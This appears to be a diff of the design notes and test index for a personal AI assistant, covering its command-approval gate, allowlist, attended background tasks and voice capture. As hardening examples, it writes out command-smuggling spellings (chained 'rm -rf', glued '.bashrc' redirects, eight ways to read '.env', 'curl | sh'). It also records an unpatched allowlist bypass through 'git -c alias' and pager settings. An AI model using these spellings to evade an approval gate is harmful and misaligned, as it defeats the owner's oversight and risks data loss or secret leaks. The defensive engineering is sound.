@@ -66,6 +66,8 @@ jarvis/
   goalrunner.py works goals in slices: steering, budgets, progress DMs
   permissions.py  modes (ask/all) + the persistent dangerous-tool allowlist
   workflows.py  background agents on their own threads (safe tools only)
+  tasks.py      attended background tasks: full-toolset agents on their own
+                threads whose approvals reach the owner's surface, attributed
   sessions.py   saved conversations: transcript, log, meta, titles, summaries
   avatars.py    who he presents as: name, wake phrases, SVG face + sanitizer
   avatar_templates.py  starter art for `jarvis avatar new` (avatars/ is
@@ -77,7 +79,8 @@ jarvis/
                 sqlite (read-only .db queries, mode=ro enforced by the
                 engine), goalctl (goal_report — how a goal run ends),
                 voicectl (mute), avatarctl (which avatar), workflows,
-                plan (the working checklist), subagent (context isolation),
+                tasks (attended background delegation), plan (the working
+                checklist), subagent (context isolation),
                 desktop (drives Windows apps via the bridge)
   runtime.py    per-run state (plan, approver, depth) over ContextVars
   windows/      bridge.py — runs on Windows Python, owns all UI Automation;
@@ -287,6 +290,10 @@ jarvis/
   - **Every segment is judged and the worst verdict wins.** `git commit && rm
     -rf /` is one string with two commands in it; first-word matching waves it
     through. Command substitution can't be judged at all, so it forces ASK.
+    `segments()` splits on `||`, `&&`, `;`, `|`, newline **and a bare `&`**
+    (the last one missing until 2026-08-17 — `ls & rm -rf ~/work` was one
+    segment and scored ALLOW), and it splits **quote-aware**, so a separator
+    inside `git commit -m 'fix A & B'` is text rather than a second command.
   - **An ALLOW is only honoured for a *human-backed* approver**
     (`permissions.gate` sets `jarvis_human_backed`; `dispatch()` checks it).
     Caught in review: `workflows.py` hands its agents a deny-all approver
@@ -298,7 +305,11 @@ jarvis/
   - **An interpreter given inline source is not a build step.** `python` is
     allowed because running a script is routine; `python -c "…"` is arbitrary
     code, and allowing the stem would have allowed the language. `-c`/`-e`
-    pulls it back to ASK.
+    pulls it back to ASK — **including glued to its argument**, since shlex
+    merges `-c"import os"` into one `-cimport os` token and the exact-token
+    test saw no flag at all until 2026-08-17. The redirect rule had the same
+    shape of hole (`echo pwned>~/.bashrc`) and is now scanned on the raw
+    segment with quote state rather than on tokens.
   - **The secrets layer still wins.** `cp` is allowed, `cp .env /tmp` is not:
     `protected_in_command` runs inside the tool and is not overridable by any
     verdict.
@@ -322,6 +333,57 @@ jarvis/
   git writes **except push** (it reaches production directly) and **except
   reset --hard / clean** (they destroy uncommitted work); **never `rm`**
   (asked, not denied); auth commands deliberately **not** denied.
+
+  **`2>&1` is not a redirect to a file** (narrowed 2026-08-17, one round after
+  the fixes above). The redirect check had become a raw scan for any unquoted
+  `>`, which is a strictly larger set than "writes to a path": `make build
+  2>&1`, `npm run build 2>&1` and `pytest -x 2>&1` all went ALLOW → ASK. Two
+  shapes carry a `>` and redirect nothing — **file-descriptor duplication**
+  (`2>&1`, `1>&2`, `2>&-`, which aim one descriptor at another or close it) and
+  a **`>` inside quotes** — and `rules.redirects_to_file()` now excludes both
+  while still catching `echo pwned > ~/.bashrc`, `echo pwned>~/.bashrc`,
+  `&>file` and `2>/dev/null`. `segments()` needed the same correction: it was
+  splitting `2>&1` on the bare `&` into a `2>` half that looked like a redirect
+  and a `1` half that looked like a command, so one line asked twice over for
+  two invented reasons.
+
+  Three edges worth keeping, all of them checked against a real bash:
+
+  - **bash's `>&word` is `&>word` when the word is not a number** — `echo hi
+    >&out.txt` really does create `out.txt` — so only digits and `-` count as
+    a duplication.
+  - **`a->b` is a redirect.** `echo a->b` creates a file called `b`. So `git
+    log --pretty=format:%h->%s` asking is *correct*, not over-reach; the fix
+    is to quote the format string. (It asked before this round too — `git log`
+    is not on the auto-approve list either way.)
+  - A line may carry both: `2>&1>out.log` is a duplication immediately
+    followed by a real redirect, and the scan has to resume *at* the end of
+    the duplication rather than one character past it.
+
+  **Known limitation, deliberately not fixed: allowlisting `git` is
+  allowlisting arbitrary code execution.** Verified by execution 2026-08-17.
+  `git -c alias.zz='!<any shell command>' zz` is one segment whose stem is
+  `git`, so an owner entry of `{"tool": "run_command", "prefix": "git"}` —
+  the single most likely entry for this owner to have created — auto-approves
+  it with nobody asked. `git -c core.pager='<command>' log` is the same shape.
+  This predates the 2026-08-17 round and none of those fixes caused it; it is
+  recorded rather than patched because the fix is a **decision**, not a defect
+  repair: either `git -c` falls to ASK (which costs the ordinary `git -C
+  /repo status` nothing but does cost `-c` users), or stem-level entries for
+  `git` stop being offerable, or nothing changes and the owner accepts that
+  the entry means what it says. A half-fix — pattern-matching `!` inside a
+  `-c` value — would be worse than none, because it would read as a boundary
+  while a shell has more spellings than any matcher has patterns, which is
+  exactly the caveat `rules.py`'s DENY section already carries. **The general
+  point stands whatever is decided: an allowlist entry for a program with a
+  config-driven escape hatch is an entry for everything that program can be
+  configured to run.** `find`, `awk`, `ssh`, `rsync` and `make` all have the
+  same shape — and so does the **`python3` entry already in the owner's real
+  allowlist**, since `allows()` is consulted *before* the rules verdict, so
+  the ASK that `python3 -c '…'` earns for inline source is never reached. That
+  ordering is deliberate (an allowlist entry is the owner overriding the ask)
+  and is not a bug; it is the reason the entries themselves are the decision,
+  and the reason `entry_for` refuses to mint one from a compound command.
 
 - **A `curl … | sh` is reviewed before it runs** (`command_review.py`). Rather
   than deny pipe-to-shell outright — installing uv or gcc that way is ordinary
@@ -351,9 +413,39 @@ jarvis/
   restart is always back to ask. The persistent allowlist
   (`~/.config/jarvis/allowlist.json`) holds only entries the owner explicitly
   created ('a' at the CLI prompt, ALWAYS on the HUD card); commands
-  allowlist by first word only ("git" ≠ "gitfoo"). Tests must point
+  allowlist by **stem**, matched whole ("git" ≠ "gitfoo"). Tests must point
   `config.ALLOWLIST_PATH` at a temp file — a UI test once wrote `apt` onto
   the real allowlist by clicking the wrong button.
+
+  **Every segment has to be allowlisted, not just the first** (fixed
+  2026-08-17 — see *The allowlist was one word wide* below). The allowlist
+  asks `rules.command_stems()` for the stem of every command the line will
+  run, and covers the request only if all of them are listed. Two shapes are
+  never covered whatever the entries say: **command substitution**, because
+  `$(...)` hides a command that cannot be enumerated, and **fetch-execute**,
+  because `curl … | sh` is remote code no static entry ever saw. A
+  *prefix-less* entry for a command tool grants nothing rather than
+  everything, and no UI path can create one.
+
+  **An entry may be written as a stem or as a full path** (narrowed
+  2026-08-17, same day). `command_stems()` reduces every command to a
+  basename, which is right for *judging* a command and wrong for *matching
+  text the owner typed into a JSON file by hand*: it made every full-path
+  entry dead on arrival, including the full-path `powershell.exe` entry in the
+  owner's real allowlist. `rules.command_targets()` returns both spellings per
+  segment and `allows()` accepts either. Neither widens anything — the match
+  is still whole-token, and still required for **every** segment, so
+  `/usr/local/bin/mytool; rm -rf ~` stays refused on the strength of the `rm`.
+  The lesson is about the failure mode rather than the matcher: **an allowlist
+  that silently stops matching is worse than one that never matched**, because
+  the owner does not learn it from the file — they learn it from being asked
+  again about something they settled months ago, with the stale entry still
+  sitting there looking correct.
+
+  **The gate's state file is not agent-writable** (same day). `write_file`
+  and `edit_file` refuse `config.ALLOWLIST_PATH` by resolved path. This is
+  the data half of SELF_PROTECTED, and the reason it needed its own
+  mechanism is in *Nothing froze the gate's data* below.
 - **Desktop control is confined to an app allowlist** (2026-07-31).
   `config.DESKTOP_APPS` is the whole door: no desktop tool accepts a window
   title, handle, or executable path, only a registered app name, so the model
@@ -442,7 +534,37 @@ jarvis/
 - **Background workflows cannot ask, so they cannot do** (`workflows.py`):
   workflow agents get SAFE_TOOLS (no browser — one shared Playwright page —
   and nothing dangerous) plus a deny-all approver. Monitoring is via
-  workflow_status / workflow_log tools.
+  workflow_status / workflow_log tools. For background work that *may* need
+  approval, see attended tasks below.
+- **Attended background tasks can ask, because the owner is reachable**
+  (`tasks.py` + `tools/tasks.py`, 2026-08-20). The workflow premise inverted:
+  a task is started from a conversation, so somebody is watching by
+  definition, and `task_start` **captures the calling agent's approver from
+  `runtime.approver()`** — the run_subagent precedent. The gate travels as an
+  *object*, never re-derived: a conversation agent's
+  `permissions.gate(broker.approver())` keeps its `jarvis_human_backed` flag
+  inside the task (allowlisted/ALLOW commands auto-run off-screen — the
+  owner's explicit call, 2026-08-20), while a deny-all parent (a workflow, an
+  unbound thread) yields a deny-all task, fail closed. Wrapping the approver
+  instead would have silently stripped the flag — the "second copy of an idea
+  drifts" failure again. Attribution is `runtime.origin()`, a ContextVar bound
+  once on the task's own thread and read by `ApprovalBroker.request()` on the
+  thread that blocks in it, so the HUD card and DM say which task is asking
+  (`_label` sanitizes the model-chosen name before it touches an approval
+  surface); with no origin bound, both surfaces are byte-identical to before.
+  Toolset is the registry minus browser (one Playwright page shared with the
+  conversation agent *in this same process* — goals get it because the
+  daemon's runner is serial), minus desktop (foreground stealing), minus
+  task/workflow/fleet tools (spawn recursion from an unwatched thread is a
+  spend amplifier; `run_subagent` stays — synchronous, inherits the task's
+  approver and toolset). Workflows, sub-agents and goals deliberately cannot
+  start tasks. Known v1 caveats: closing the HUD still
+  `deny_all("window-closed", include_remote=False)`s a task's card-only ask
+  rather than migrating it to Discord; the registry is in-memory (restart
+  forgets; durable output is files/memory); and the CLI denies background
+  approvals with a printed note (`_approve` main-thread guard) because two
+  threads cannot share one stdin — the face and daemon are the surfaces that
+  can answer them.
 - **Jarvis may not touch his own control plane.** `config.is_face_origin()` —
   the browser and `fetch_page` refuse it, ahead of `allowed_hosts='*'`.
   Otherwise he could drive his own HUD and approve himself.
@@ -545,6 +667,17 @@ jarvis/
   numbering while leaving a numeric TSV column alone, and grep_files across all
   three modes, glob, case, cap, context lines and skipping `.env`.
 
+  Two groups added 2026-08-17. **The approval gate's state file is refused by
+  both write tools** — `config.ALLOWLIST_PATH` is pointed at a temp file for
+  the whole suite and the protection is read from `config` per call, so this
+  exercises the temp file and never the owner's real one; it covers the
+  overwrite, the surgical edit, and the create-from-nothing case (write_file
+  makes parents, so "not there yet" was the easier attack). And
+  **`grep_files`' protected-file filter is asserted against both backends with
+  their answers required to be identical** — rg context lines, a single
+  protected file as `path`, and the count-mode match oracle, each of which the
+  colon-prefix filter missed and the fallback never did.
+
   **The two backends must agree, and proving that needs `rg` installed.** It
   was not, so the original "run it twice" claim was really the fallback twice —
   which is how the gitignore bug (below) stayed green. The suite asserts the
@@ -623,7 +756,15 @@ jarvis/
   through POST /avatar; and an SSE `avatar` broadcast relabels live.
 - `tests/secrets_check.py` — free synthetic checks for the `.env` protection,
   against a throwaway dir holding a fake key. Includes a replay of the actual
-  leak (a recursive grep that never names `.env`). Run it after touching
+  leak (a recursive grep that never names `.env`), and since 2026-08-17 the
+  **parser gaps in layers 2 and 3**: eight smuggled spellings of a protected
+  name (`cat<.env`, `sh -c 'cat .env'`, `env sh -c …`, `python -c
+  "open('.env')"`, `F=.env; cat $F`, `cat $(echo .env)`) refused while
+  `.env.example` / `.envrc` / `myapp.env` stay readable, and `scrub()`
+  dropping context-line (`path-N-text`), tab and NUL attributions the way it
+  always dropped colon ones — including end-to-end through real `dispatch()`
+  on a `grep -C2`, which is the shape that walked a credential file past the
+  scrub while still printing the "withheld" counter. Run it after touching
   `secrets.py`, `dispatch()`, or either shell tool.
 - `tests/gmail_check.py` — free synthetic checks for the Gmail integration:
   refresh-token exchange and caching against a fake transport, search/read/
@@ -657,6 +798,41 @@ jarvis/
   gates approvals. Harness note worth copying: **close each turn's `/converse`
   response with a `None`**, or the previous handler is still blocked on the
   queue and the next turn's lines are delivered to a dead connection.
+- `tests/face/hud_capture_check.py` — free headless checks for the mic being
+  open all the time, and for the detector that carves turns out of it. Two
+  browser contexts, for two questions: one with a granted (deliberately
+  **silent**) fake device, asserting the ring fills from boot with nothing
+  held and nothing said; and one with the microphone **denied**, so the ring
+  is written only by the test and the sample arithmetic is exact. Driving it
+  needs no audio — a frame of N samples at a constant amplitude has exactly
+  that RMS, so `__hud.mic.feedMs()` scripts a room through the real
+  `onCaptureFrame`, ring, segmentation and upload. The three owner complaints
+  are three assertions: speech at 0.02 opens an utterance (the old fixed 0.045
+  never would), a 1.1s pause mid-sentence does not end one, and 20s of
+  background talk lifts the threshold instead of wedging the recording to its
+  cap. Plus: an unclaimed utterance is never sent, a late wake hit claims the
+  one already in flight and uploads *more* audio than was spoken (the pre-roll
+  that used to be lost), the follow-up window opens and closes, his own speech
+  never becomes a turn, a 90ms noise is not a turn and does not consume the
+  window, and push-to-talk keeps its pre-roll while a tap is still refused.
+  Since 2026-08-20 it also owns the **MIC mute** (the owner's input-side mute):
+  muted, speech opens and uploads nothing, wake hits and the follow-up window
+  are inert, push-to-talk records nothing while the orb still interrupts, the
+  threshold keeps tracking the room, the state survives a reload, and **audio
+  captured while muted never leaves the machine** — the wake back-dating that
+  would reach across an unmute is clamped at the unmute mark (verified to
+  bite: with the clamp removed, 2.6s of muted-period audio uploads).
+- `tests/face/speculation_check.py` — free checks for synthesizing ahead of the
+  turn, `voice.tts` replaced by a recorder so nothing is rendered. The first
+  one is the whole safety argument: six replies fed **character by character**,
+  with every chunk ever declared settled required to survive byte-for-byte to
+  the finished reply — if that fails, the speculator spends the TTS lock on
+  strings that are never spoken and is slower than not speculating at all.
+  Then: a hit is not also re-rendered and nothing is synthesized twice, guesses
+  made before a tool call are dropped on `interim_text`, the limit holds on a
+  40-sentence reply, a failing synthesis *and* a failing guess both leave the
+  turn alone, and muted turns speculate nothing. Run after touching
+  `_sentences`, `_stable_chunks`, `_Speculator`, or the delta sink.
 - `tests/stream_check.py` — free checks for streamed completions, the HTTP
   layer faked: content and split tool calls reassembling by index, usage/model/
   finish_reason surviving, **a mid-stream cancel raising `Cancelled` and
@@ -676,12 +852,41 @@ jarvis/
   fetch-execute detection, every reviewer verdict including safe-but-untrusted-
   host and the `JARVIS_REVIEW_AUTOAPPROVE=0` kill switch, every reviewer failure
   path ending in *unclear*, the prompt fencing the script as untrusted data, and
-  both new files being SELF_PROTECTED. Run after touching `rules.py`,
-  `command_review.py`, `permissions.gate`, or `dispatch()`.
+  both new files being SELF_PROTECTED. Since 2026-08-17 it also owns the
+  **separator and gluing** cases — a bare `&` splitting, glued redirects
+  (`echo pwned>~/.bashrc`) and glued inline source (`python -c"import os"`)
+  all falling to ASK, quote-aware segmentation keeping `git commit -m 'fix A &
+  B'` at ALLOW, and `command_stems` refusing to enumerate a substitution — and
+  a **`run_readonly` section**, because that tool is ungated and its allowlist
+  is therefore the whole boundary: 39 escapes (newline and `&` separators,
+  `env sh -c` wrappers, the writing git subcommands, `cat<.env`, and `find` in
+  its `-exec`/`-delete` forms) refused and 14 ordinary reads still unattended.
+
+  Since the same day it also owns **both narrowing suites**, because a
+  boundary is only correct together with the ordinary work it lets through.
+  `redirect_shape_checks` grades 21 redirect shapes on whether they write to a
+  path — fd-duplication and quoted `>` do not, `&>file`, `>&word`,
+  `2>/dev/null` and `2>&1>out.log` do — and pins `2>&1` surviving
+  segmentation intact. `run_readonly_narrowing_checks` pins 21 git reads and 9
+  quoted metacharacters still running unattended, alongside the writing form
+  of every subcommand it names. Run after touching `rules.py`,
+  `tools/shell.py`, `command_review.py`, `permissions.gate`, or `dispatch()`.
 - `tests/permissions_check.py` — free checks for modes and the allowlist:
-  gate ordering, prefix vs whole-tool matching, persistence without
+  gate ordering, stem vs whole-tool matching, persistence without
   duplicates, mode "all" bypass, and the broker's ALWAYS path writing an
-  entry. Run after touching `permissions.py` or `approvals.py`.
+  entry. Since 2026-08-17 also the two halves of the one-word-wide hole:
+  **every segment must be covered** (a `git` entry covers `git push` and
+  `nohup git push`, and covers none of `git status && rm -rf ~`, the `;`/`&`/
+  `|`/newline spellings of it, a `$(...)`, or a `curl … | sh`) and the gate
+  really handing a smuggled line to the surface approver; plus **no path mints
+  a wildcard** — `entry_for` raises on an empty or compound command, and a
+  prefix-less command entry written straight into the JSON authorises nothing.
+  Plus the narrowing: a **full-path entry still matches** (`/usr/local/bin/
+  mytool run`, wrapped, and beside a `git` entry on one line) while covering
+  only itself — not the bare basename, not the same name under another path,
+  not a string prefix of it, and not a second command riding behind it.
+  Run after touching `permissions.py`, `rules.command_targets`, or
+  `approvals.py`.
 - `tests/skills_check.py` — free checks for skill tools (round-trip, bad
   names, starter skills parse) and the index: render/refresh/cap, plus
   agent-level injection against a faked `llm.chat` (present and per-turn
@@ -690,6 +895,24 @@ jarvis/
 - `tests/workflows_check.py` — free checks with a faked `llm.chat`:
   background lifecycle, status/log tools, deny-all approver, safe toolset,
   concurrency cap. Run after touching `workflows.py`.
+- `tests/tasks_check.py` — free checks for attended background tasks, with
+  `llm.chat` scripted, `shell._run` a recorder, the broker on approval_check's
+  FakeWindow and the DM sender injected. The headline: a task's dangerous call
+  raises the card **with the task's origin label**, approve runs it, deny does
+  not, and the same flow works remotely (DM carries the origin line, a typed
+  yes runs it). The capture properties both ways: a real gate keeps its
+  human-backed flag inside a task (an ALLOW `git commit` runs with **no
+  card**), and an unbound context yields a deny-all task. The
+  nothing-changed half: with no origin bound the SSE payload has no origin key
+  and the DM body is byte-identical to the pre-task shape (verified to bite
+  against unconditional attribution). Plus: toolset exclusions and task tools
+  absent from `workflows.SAFE_TOOLS` / `SUBAGENT_TOOLS` / `goal_tool_names()`,
+  the context-block section for armed agents only, the concurrency cap,
+  cancel landing at the step boundary *without* resolving a pending card, the
+  label sanitizer, and origin inheritance through `copy_context()` with no
+  cross-context leak. Points `config.ALLOWLIST_PATH` at a temp file for the
+  whole run. Run after touching `tasks.py`, `tools/tasks.py`, `runtime.py`,
+  or `ApprovalBroker.request`.
 - `tests/discord_approvals_check.py` — free checks for remote approval, with
   the DM sender injected (no network): yes/no/always resolve the exact
   request, a "yes" in a guild channel is not an authorization, two open asks
@@ -781,6 +1004,19 @@ jarvis/
   6 lookalikes (`snake_case`, `2 * 3 * 4`, prose) come back byte-identical,
   fences are dropped rather than read aloud, and `tts()` applies the strip
   itself so no speech path can forget. Run after touching `voice.py`.
+- `tests/voice_pocket_check.py` — free checks for the Pocket TTS backend, a
+  fake `pocket_tts` injected into `sys.modules` (its sample rate deliberately
+  16000, not Kokoro's 24000, so a hardcoded rate fails). The cases that
+  matter are the degradations, written to fail against the pre-pocket code:
+  a raising backend, a missing store voice, the library absent, and a
+  `JARVIS_TTS_VOICE=pocket:x` loop all land on a Kokoro name — the cloud
+  never once sees a `pocket:` name. Also: routing at the backend's own rate
+  with model/state cached, the speed-ignored-once warning, `set_voice`
+  accept/reject/clear, an avatar speaking a pocket voice, the `_blend`
+  mixing math on numpy (normalization, head-keeping seq trim, every loud
+  refusal), clone/mix/rm store round-trips, and `/voices` + `POST /voice`
+  against a real threaded server (grouped entries, `""` clears the override,
+  404/403). Run after touching `pocket.py`, `voice.py`, or `_switch_voice`.
 - `tests/face/hud_markdown_check.py` — free headless checks that the HUD
   *renders* his markdown in the real `jarvis.html`: 13 constructs become
   elements, `textContent` still holds the words (what the other HUD suites
@@ -813,8 +1049,13 @@ jarvis/
   registered, the wire protocol against a fake bridge on a real loopback
   socket (error propagation, mid-request death, no-bridge message), and that
   no desktop tool takes a title/handle/path or reaches background workflows.
-  Run after touching `desktop.py`, `tools/desktop.py`, `windows/bridge.py`,
-  or `windows/uiatree.py`.
+  Since 2026-08-17 it also pins `forbidden_title()` as a **substring** match
+  (a suffixed or prefixed HUD title is still refused, because bridge.py finds
+  windows by substring) and reads both `<title>` tags out of the real
+  `jarvis.html` / `whiteboard.html` rather than trusting hardcoded copies —
+  renaming a page used to disarm the check silently. Run after touching
+  `desktop.py`, `tools/desktop.py`, `windows/bridge.py`, or
+  `windows/uiatree.py`.
 - `tests/browser/math_drill_smoke.py` — headed end-to-end browser test: serves
   a local JS-rendered form wizard (`tests/browser/pages/math-drill/`) and has
   the agent complete it. Real API calls (~$0.001/run); the window stays open
@@ -1219,9 +1460,9 @@ the push-to-talk button, so an avatar that could blank it would take the
 surface's main control with it, and `hud_avatar_check` pins that.
 
 **An avatar has a voice too (2026-08-06).** `avatar.json` takes `voice` (a
-Kokoro voice name — `voice.available_voices()` lists the 54 already in the
-local bundle, so this costs no download and no latency: same model, different
-style vector) and an optional `speed`. Resolution lives in **`voice.tts()`**,
+name from `voice.catalog()` — a Kokoro bundle voice, of which
+`voice.available_voices()` lists the 54 already local, or since 2026-08-20 a
+`pocket:` name — see *Pocket TTS* below) and an optional `speed`. Resolution lives in **`voice.tts()`**,
 not the call sites — the same rule as `speakable()`, because three surfaces
 synthesize speech (face, `/say`, Discord voice notes) and a fourth will. It
 reads the active avatar per call, so a switch moves the voice on the next
@@ -1617,6 +1858,299 @@ log printed `**Done.**` as source, and TTS read the asterisks aloud.
 Not done: `whiteboard.html`'s reply panel still shows raw text. Sharing the
 renderer means lifting it out of `jarvis.html` into a static JS file both
 pages load.
+
+**Voice round 2 (2026-08-18) — the mic stops being a button.** Three owner
+complaints, one architecture: *"I have to wake jarvis each time by saying his
+name"*, *"sometimes the recording gets cut"*, and *"somebody is talking in the
+background and it just doesn't send"*. All three were the same design fault —
+the microphone opened when a turn started and closed when it ended, so every
+question about *when speech begins and ends* had to be answered before the
+audio existed.
+
+**The mic is now open from boot and never closes.** Audio flows continuously
+into a 40-second ring buffer at 16kHz (parakeet's own rate, so resampling in
+the browser costs nothing and shrinks the upload); utterances are carved out
+of the ring *afterwards* by a detector, and the payload is a WAV the HUD
+builds itself rather than a webm the MediaRecorder owns. Everything is
+measured in **samples, not wall-clock milliseconds** — the audio thread is the
+only clock that cannot drift against the buffer actually being sent.
+
+What each complaint turned out to be:
+
+- **The first word was missing on every wake-word turn.** Chrome's recognizer
+  reports a phrase several hundred ms after it was said, and `onWake` called
+  `startRec()` at *that* moment — so recording began somewhere inside "what's
+  the weather". Nothing starts recording now; a wake hit only decides where to
+  cut, and back-dates the start past the lag. Measured in
+  `hud_capture_check.py`: 1.4s spoken uploads as 2.9s, and the difference is
+  exactly what used to be lost. Push-to-talk gets the same pre-roll, so
+  talking the instant you press no longer clips the first syllable.
+- **A fixed threshold cannot be right twice.** The old detector compared a raw
+  peak against a hard-coded `0.045` with a 1400ms hangover. On a quiet mic
+  ordinary speech never cleared it, so a breath mid-sentence ended the turn;
+  in a noisy room the level never fell *below* it, so the end of the utterance
+  was never detected and the recording ran to its 15s cap. The floor is
+  tracked from the room now — falling fast (0.2s) so a room going quiet is
+  followed within a breath, rising slowly (8s) so background chatter has to be
+  sustained to count, and **rising slower still while an utterance is open
+  (25s), so the owner's own voice cannot walk the threshold up underneath
+  itself and cut the sentence off.** Verified: 20s of background talk lifts the
+  threshold 0.0200 → 0.0875 and leaves nothing wedged open, while speech at
+  0.02 — which the old 0.045 could never see — opens an utterance in a quiet
+  room.
+
+  The time constants are **in seconds, not per frame**. They were per-frame
+  first, which silently means a different amount of time on a different buffer
+  size — and made the first test that fed one large frame measure something
+  the microphone never does.
+- **His name is not needed every time.** A follow-up window opens the moment he
+  stops speaking (`doneSpeaking()`), so the next utterance is simply the next
+  turn. This is free rather than new machinery: the mic was never closed, so
+  there is nothing to reopen. The window is stated in the hint ("JUST SPEAK ·
+  STILL LISTENING") — an affordance nobody knows about is one nobody uses —
+  and expires on its own timer, because nothing else redraws while the HUD is
+  idle and a lapsed promise is worse than none.
+
+Four rules the design turns on, each of which was a bug first:
+
+- **An utterance is only sent if it was addressed to him**: the orb was held, a
+  wake phrase was heard around it, or it landed in the follow-up window.
+  Everything else is captured and discarded. Continuous capture without that
+  gate is a hot mic.
+- **A wake phrase claims exactly one utterance.** Leaving the hit live for the
+  rest of its grace window let the *next* thing said — an aside to someone
+  else, a sentence finished after he had already started — arrive as a second
+  turn nobody addressed to him. Found by a test that failed for what looked
+  like a harness reason and was not.
+- **He does not answer himself.** The detector is suppressed while he is
+  speaking, thinking, or holding an authorization card. It still *tracks the
+  room* through all of it, so the threshold is current the moment the
+  follow-up window opens. Barge-in stays deliberate — orb, space, or his name
+  — because an open mic that interrupts on any sound interrupts on the wrong
+  ones.
+- **The minimum length is measured on the speech, not the segment.** The
+  segment is padded at both ends, so measuring *it* let a 90ms cough clear a
+  350ms floor on padding alone. `VAD.voiced` counts only frames above the
+  threshold. Relatedly, the hangover is trimmed off the end before upload —
+  it is the silence that *proved* the utterance ended, and shipping it is a
+  second of nothing for the transcriber.
+
+**And the reply starts sooner (same day).** Two independent fixes, measured
+against local Kokoro:
+
+- **`_sentences()` was defeating its own purpose.** The rule that keeps a stray
+  fragment from becoming its own chunk ("A tiny one.") also fired when the
+  *previous* chunk was short — which is exactly the opener. So a perfect
+  20-character first chunk was swallowed into a 98-character one, and the
+  first-chunk clamp then hacked *that* apart at the last space, between "is"
+  and "complete." **1633ms to first audio instead of 607ms, plus an audible
+  break mid-phrase, on the one metric the function exists to optimize.** The
+  two merge reasons are not symmetric and are now held apart in `_merges()`:
+  a tiny *incoming* part is always glued back; a tiny *preceding* chunk
+  absorbs what follows unless it is the opener. The clamp's no-clause fallback
+  also backs off past a **binding word** (`_BINDING` — articles, auxiliaries,
+  prepositions, determiners, degree adverbs), because a cut is permanent and
+  audible while backing off a word costs nothing.
+- **TTS now runs while the model is still writing** (`_Speculator`). The text
+  has been streaming all along — it is what draws the HUD's live draft — so
+  chunks are built as they appear and are waiting when `run_turn` returns.
+  **Turn-end to first audio: 879ms → 188ms, 3 of 4 chunks pre-rendered.**
+
+  The owner's call, and the safe one: **audio still goes out only after the
+  turn completes**, in order, exactly as before. A sentence spoken early is a
+  sentence a later tool call can contradict. So this is a *cache keyed on the
+  chunk text* — a guess that does not match the finished reply is thrown away
+  and resynthesized, and being wrong costs CPU rather than correctness.
+
+  But wrong is not free, and that shapes the whole thing: **local Kokoro
+  serializes on one model instance** (`_kokoro_lock` — which is also why the
+  "two in flight" pool only ever measured 1.24x, not 2x), so a wasted
+  synthesis holds the lock the chunk actually being waited on needs. Hence
+  `_stable_chunks()`, which declares a chunk settled only once the one after
+  it exists *and* is too long to be merged back into it; hence
+  `SPECULATION_LIMIT`; and hence the reset on **`interim_text`**, which is the
+  loop's existing signal that a step ended in a tool call and everything
+  streamed so far was thinking out loud rather than the answer.
+
+  `feed()` guards its **whole body**, not just the synthesis: it runs inside
+  `llm.chat`'s streaming loop by way of `on_delta`, so anything raised there
+  comes out of the middle of the model call. The first version guarded only
+  "the part I thought could fail", which is not the same promise — the test
+  caught it.
+
+- **Chunk boundaries are deliberate now** (`voice._repad`). Each Kokoro chunk
+  carried ~30ms of lead-in and ~85-105ms of tail, and back-to-back scheduling
+  turns that padding *into* the pause between sentences — the same pause
+  whether the boundary fell between two sentences or in the middle of one.
+  Since the clamp splits a long opener mid-phrase routinely, that read as a
+  stumble. The pad is trimmed and put back sized by what the chunk ends on:
+  130ms after a full stop, 70ms after a clause, 15ms after a bare word cut. A
+  margin is kept at both ends so a plosive's attack and a final decay survive,
+  and a chunk that never rises above the floor is returned untouched — a quiet
+  chunk is recoverable, an empty one is a dropped sentence.
+
+Still cloud, still one shot: **STT is unchanged.** `voice.stt()` sends the
+whole utterance to parakeet when it closes. Streaming/incremental
+transcription would need a websocket endpoint OpenRouter's transcription API
+does not offer, and is the next thing to look at if the remaining latency
+matters.
+
+**The owner can mute themselves (2026-08-20).** An always-open mic needs an
+off switch the owner controls: the **MIC row** in SYSTEMS (beside WAKE WORD;
+VOICE OUT remains his output mute). It is HUD-local by design — capture,
+segmentation and wake all live in `jarvis.html`, so there is no server state
+and **no tool**: an agent that could deafen its own input channel is a lever
+Jarvis must not hold, and with the mic off, "jarvis, unmute" could never be
+heard anyway — unmute is a click. Strict semantics, each one a deliberate
+choice: nothing is ever claimed or uploaded while muted; the **wake
+recognizer is stopped outright** (it streams audio to Google's speech
+service — a muted mic must stop that too, so the recognizer is re-armed from
+`wakeMode` on unmute and `setWake` while muted only records intent); the orb
+**still interrupts** him but records nothing (mute must not take away the way
+to shut him up); the ring keeps filling *locally* so the room threshold is
+current at unmute; the orb's level meter reads zero (a level meter on a muted
+mic promises listening); the hint says MIC MUTED · TYPE · OR UNMUTE IN
+SYSTEMS, since every other hint is an invitation to speak; the state persists
+in localStorage and **fails toward muted** across a reboot (a window that
+restarts into a hot mic is the wrong surprise — the same reasoning as the
+wake toggle, in the opposite direction); and `sendUtterance` clamps every
+upload at the last unmute mark, because the wake path back-dates an
+utterance's start by WAKE_GRACE + PREROLL and across an unmute that would
+ship audio recorded while the owner believed the mic was off. Typed input is
+untouched — muting the mic and typing is the point. Covered by the mic-mute
+section of `tests/face/hud_capture_check.py`.
+
+**Pocket TTS shipped (2026-08-20) — a second local voice backend, with
+cloned and hybrid voices** (`jarvis/pocket.py`; pinned synthetically by
+`tests/voice_pocket_check.py`, live-smoked same day — findings at the end
+of this section). Kyutai's pocket-tts is a 100M-param CPU TTS
+with zero-shot cloning: ≤30s of someone speaking becomes a voice, and the
+computed prompt state (the model's KV-cache) exports to a `.safetensors`
+that reloads fast. Install: `uv pip install -e .[pocketvoice]` — it pulls
+CPU PyTorch, the first heavyweight ML stack in the venv; use a CPU torch
+index so a CUDA wheel doesn't ride along. Weights download from HF on first
+use. The rules, in the order they matter:
+
+- **The namespace is the router.** Pocket voices are `pocket:<name>`
+  (`pocket:alba` builtin, `pocket:dad` clone/hybrid); bare names stay
+  Kokoro's, so avatars and config needed no migration. The prefix is applied
+  and stripped only in `voice.py` — `pocket.py` deals in bare names — and
+  `tts()` routes per resolved voice, so the face pre-warm, `/say`, Discord
+  and the speculator all needed zero changes. Pocket serializes on its own
+  `_lock` beside `_kokoro_lock` (never nested; the fallback runs outside it).
+- **The cloud never sees a `pocket:` name.** Any pocket failure — raising
+  model, missing store entry, library absent — warns once and degrades to
+  `config.TTS_VOICE` on the existing Kokoro→cloud chain; if the configured
+  default is itself `pocket:`, it degrades to `bm_george` so the fallback
+  cannot loop. This preserves both standing invariants: every path leaves
+  him audible, and the cloud only receives names it can synthesize. Speed is
+  ignored on pocket (no such control) with a once-per-process note.
